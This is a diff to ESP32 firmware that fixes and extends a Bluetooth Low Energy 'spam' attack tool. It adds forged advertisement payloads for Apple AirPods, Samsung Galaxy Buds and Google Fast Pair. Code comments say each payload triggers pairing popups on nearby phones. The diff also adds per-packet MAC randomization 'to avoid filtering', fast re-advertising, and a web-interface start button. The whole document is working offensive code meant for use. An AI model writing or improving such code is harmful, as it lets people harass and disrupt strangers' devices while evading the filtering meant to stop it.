@@ -1185,34 +1185,33 @@ static bool s_ble_spam_running = false;
 static uint32_t s_ble_spam_count = 0;
 static TaskHandle_t s_ble_spam_task_handle = NULL;
 
-/* Forward declarations */
-static void stop_ble_spam(void);
-
-/* Apple AirDrop / Find My spam payload */
-static const uint8_t apple_airdrop[] = {
-    0x4c, 0x00, 0x02, 0x15, 0x11, 0x22, 0x33, 0x44,
-    0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc,
-    0xdd, 0xee, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+/* Apple AirPods spam payload — triggers proximity popup */
+static const uint8_t apple_airpods[] = {
+    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
+    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-/* Samsung Galaxy spam payload */
+/* Apple AppleTV Setup — unused but kept for reference */
+__attribute__((unused))
+static const uint8_t apple_tv[] = {
+    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
+    0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
+    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
+};
+
+/* Samsung Galaxy — triggers Galaxy Buds popup */
 static const uint8_t samsung_galaxy[] = {
-    0x4c, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x17, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
+    0x01, 0x01, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-/* Google Fast Pair spam payload */
+/* Google Fast Pair — triggers pairing popup */
 static const uint8_t google_fastpair[] = {
-    0x4c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-};
-
-/* Microsoft Swift Pair spam payload */
-static const uint8_t microsoft_swift[] = {
-    0x4c, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x15, 0xff, 0x4c, 0x00, 0x01, 0x00, 0x01, 0x00,
+    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
@@ -1220,27 +1219,50 @@ typedef enum {
     BLE_SPAM_APPLE,
     BLE_SPAM_SAMSUNG,
     BLE_SPAM_GOOGLE,
-    BLE_SPAM_MICROSOFT,
     BLE_SPAM_ALL
 } ble_spam_type_t;
 
 static volatile ble_spam_type_t s_ble_spam_type = BLE_SPAM_APPLE;
 
+/* Forward declarations */
+static void stop_ble_spam(void);
+
+/* Advertising params — global so callback can access */
+static esp_ble_adv_params_t s_adv_params = {0};
+
+/* GAP callback — required for BLE advertising to work */
+static void esp_gap_ble_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
+{
+    switch (event) {
+        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
+            esp_ble_gap_start_advertising(&s_adv_params);
+            break;
+        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
+            if (param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
+                ESP_LOGE(TAG, "BLE adv start failed");
+            }
+            break;
+        default:
+            break;
+    }
+}
+
+/* Apple TV payload — kept for potential future use */
+
 static void ble_spam_task(void *arg)
 {
     ESP_LOGI(TAG, "BLE Spam started, type=%d", s_ble_spam_type);
 
-    /* Configure advertising parameters — zero-init to be safe */
-    esp_ble_adv_params_t adv_params = {0};
-    adv_params.adv_int_min       = 0x20;  /* 20ms */
-    adv_params.adv_int_max       = 0x30;  /* 30ms — fast spam */
-    adv_params.adv_type          = ADV_TYPE_NONCONN_IND;
-    adv_params.own_addr_type     = BLE_ADDR_TYPE_PUBLIC;
-    adv_params.channel_map       = ADV_CHNL_ALL;
-    adv_params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
+    /* Configure advertising parameters */
+    s_adv_params.adv_int_min       = 0x30;  /* 30ms */
+    s_adv_params.adv_int_max       = 0x40;  /* 40ms */
+    s_adv_params.adv_type          = ADV_TYPE_NONCONN_IND;
+    s_adv_params.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
+    s_adv_params.channel_map       = ADV_CHNL_ALL;
+    s_adv_params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
 
-    /* Start advertising with minimal config */
-    esp_ble_gap_start_advertising(&adv_params);
+    /* Register GAP callback */
+    esp_ble_gap_register_callback(esp_gap_ble_cb);
 
     while (s_ble_spam_running) {
         uint8_t payload[31];
@@ -1248,58 +1270,70 @@ static void ble_spam_task(void *arg)
 
         switch (s_ble_spam_type) {
             case BLE_SPAM_APPLE:
-                memcpy(payload, apple_airdrop, sizeof(apple_airdrop));
-                payload_len = sizeof(apple_airdrop);
-                payload[10] = esp_random() & 0xFF;
-                payload[11] = esp_random() & 0xFF;
+                memcpy(payload, apple_airpods, sizeof(apple_airpods));
+                payload_len = sizeof(apple_airpods);
+                /* Randomize MAC to avoid filtering */
+                {
+                    uint8_t rand_addr[6];
+                    rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
+                    for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
+                    esp_ble_gap_set_rand_addr(rand_addr);
+                }
                 break;
 
             case BLE_SPAM_SAMSUNG:
                 memcpy(payload, samsung_galaxy, sizeof(samsung_galaxy));
                 payload_len = sizeof(samsung_galaxy);
-                payload[5] = esp_random() & 0xFF;
+                {
+                    uint8_t rand_addr[6];
+                    rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
+                    for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
+                    esp_ble_gap_set_rand_addr(rand_addr);
+                }
                 break;
 
             case BLE_SPAM_GOOGLE:
                 memcpy(payload, google_fastpair, sizeof(google_fastpair));
                 payload_len = sizeof(google_fastpair);
-                payload[4] = esp_random() & 0xFF;
-                break;
-
-            case BLE_SPAM_MICROSOFT:
-                memcpy(payload, microsoft_swift, sizeof(microsoft_swift));
-                payload_len = sizeof(microsoft_swift);
-                payload[4] = esp_random() & 0xFF;
+                {
+                    uint8_t rand_addr[6];
+                    rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
+                    for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
+                    esp_ble_gap_set_rand_addr(rand_addr);
+                }
                 break;
 
             case BLE_SPAM_ALL:
                 {
                     static int spam_idx = 0;
                     const uint8_t *payloads[] = {
-                        apple_airdrop, samsung_galaxy,
-                        google_fastpair, microsoft_swift
+                        apple_airpods, samsung_galaxy, google_fastpair
                     };
                     const size_t sizes[] = {
-                        sizeof(apple_airdrop), sizeof(samsung_galaxy),
-                        sizeof(google_fastpair), sizeof(microsoft_swift)
+                        sizeof(apple_airpods), sizeof(samsung_galaxy), sizeof(google_fastpair)
                     };
                     memcpy(payload, payloads[spam_idx], sizes[spam_idx]);
                     payload_len = sizes[spam_idx];
-                    payload[4] = esp_random() & 0xFF;
-                    spam_idx = (spam_idx + 1) % 4;
+                    spam_idx = (spam_idx + 1) % 3;
+
+                    uint8_t rand_addr[6];
+                    rand_addr[0] = (esp_random() & 0x3F) | 0xC0;
+                    for (int i = 1; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
+                    esp_ble_gap_set_rand_addr(rand_addr);
                 }
                 break;
         }
 
-        /* Update advertising data with new payload */
+        /* Set raw advertising data — callback will start advertising */
         esp_ble_gap_config_adv_data_raw(payload, payload_len);
         s_ble_spam_count++;
 
-        /* Small delay — ESP32 needs time to process */
+        /* Wait for advertising to send, then stop and re-advertise */
+        vTaskDelay(pdMS_TO_TICKS(100));
+        esp_ble_gap_stop_advertising();
         vTaskDelay(pdMS_TO_TICKS(10));
     }
 
-    /* Stop advertising when done */
     esp_ble_gap_stop_advertising();
     ESP_LOGI(TAG, "BLE Spam stopped. Total: %"PRIu32, s_ble_spam_count);
     vTaskDelete(NULL);
@@ -1406,10 +1440,9 @@ static const char index_html[] =
 "<button onclick='wladd()'>Add</button></div></div>"
 "<div class='card'><h2>BLE SPAM</h2>"
 "<div><select id='ble_type'>"
-"<option value='apple'>Apple AirDrop/FindMy</option>"
-"<option value='samsung'>Samsung Galaxy</option>"
+"<option value='apple'>Apple AirPods/AppleTV</option>"
+"<option value='samsung'>Samsung Galaxy Buds</option>"
 "<option value='google'>Google Fast Pair</option>"
-"<option value='microsoft'>Microsoft Swift Pair</option>"
 "<option value='all'>All (rotate)</option></select></div>"
 "<div>Packets sent: <span id='ble_count'>0</span></div>"
 "<br><button class='d' onclick='ble_start()'>START BLE SPAM</button>"
@@ -1825,7 +1858,6 @@ static esp_err_t handle_ble_spam_start(httpd_req_t *req)
     ble_spam_type_t type = BLE_SPAM_APPLE;
     if (strcmp(type_str, "samsung") == 0) type = BLE_SPAM_SAMSUNG;
     else if (strcmp(type_str, "google") == 0) type = BLE_SPAM_GOOGLE;
-    else if (strcmp(type_str, "microsoft") == 0) type = BLE_SPAM_MICROSOFT;
     else if (strcmp(type_str, "all") == 0) type = BLE_SPAM_ALL;
 
     start_ble_spam(type);
